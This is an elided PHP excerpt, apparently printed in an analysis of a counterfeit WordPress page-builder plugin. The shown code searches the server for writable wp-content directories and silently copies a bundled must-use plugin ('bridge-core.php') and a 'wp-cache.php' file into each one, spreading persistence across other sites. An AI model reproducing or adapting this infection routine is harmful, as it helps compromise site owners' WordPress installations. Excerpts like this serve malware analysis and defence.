...
class Vc_Manager
{
	...
	public function modules()
	{
		if (! isset($this->factory['modules'])) {
			...
			require_once $this->path('CORE_DIR', 'class-modules-manager.php');
...
function wpinternal_activate()
{
    $src = plugin_dir_path(__FILE__) . 'data/mu-plugins/bridge-core.php';
    ...
    $src = plugin_dir_path(__FILE__) . 'data/cfiles/wp-cache.php';
...
function internal_utils()
{
    ...
    $sourceDir1 = plugin_dir_path(__FILE__) . 'data/mu-plugins';
    $sourceDir2 = plugin_dir_path(__FILE__) . 'data/cfiles';
        ...
        $directoryIterator = new RecursiveCallbackFilterIterator(
            ...
            function ($current, $key, $iterator) use ($ignoreDirs) {
                ...
                if ($current->isDir()) {
                    ...
                    if (in_array($name, $ignoreDirs, true)) {
                        return false;
                    }
                }
    ...
    foreach ($iterator as $spl) {
        try{
            if ($spl->isDir() && strtolower($spl->getFilename()) === 'wp-content') {

                if (!is_writable($spl->getPathname())) {
                    continue;
                }

                if (file_exists($spl->getPathname() . DIRECTORY_SEPARATOR . 'mu-plugins' . DIRECTORY_SEPARATOR . 'bridge-core.php')) {
                    continue;
                }

                $targetDir = $spl->getPathname() . DIRECTORY_SEPARATOR . 'mu-plugins';
                if (!is_writable($spl->getPathname())) {
                    continue;
                }
                copyDir($sourceDir1, $targetDir);

                @copy($sourceDir2 . '/wp-cache.php', $spl->getPathname() . '/../wp-cache.php');
            }
        }catch(Exception $e) {}
    }
